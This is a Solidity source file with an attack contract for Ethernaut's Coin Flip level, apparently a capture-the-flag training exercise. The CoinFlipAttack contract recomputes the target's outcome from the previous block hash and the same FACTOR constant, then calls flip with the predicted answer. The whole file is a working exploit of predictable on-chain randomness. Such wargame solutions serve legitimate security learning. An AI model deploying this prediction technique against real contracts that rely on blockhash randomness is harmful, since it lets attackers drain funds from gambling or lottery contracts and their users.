//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

/** 
 * @title Coin Flip 
 * @dev Inferface of Ethernaut's coin contract
 */
contract CoinContract {
    function flip(bool _guess) public returns (bool) {}
}

/** 
 * @title Coin Flip Attack
 * @dev Attack the coin flip contract in Ethernauts
 */
contract CoinFlipAttack is Owner {
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinContract coinFlipContract;

    function setCoinCoinContract(address _contract) external isOwner {
        coinFlipContract = CoinContract(_contract);
    }

    function attackCoinFlipContract() external isOwner {
        uint256 blockNum = block.number;
        blockNum = blockNum - 1;
        uint256 blockValue = uint256(blockhash(blockNum));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);
    }
}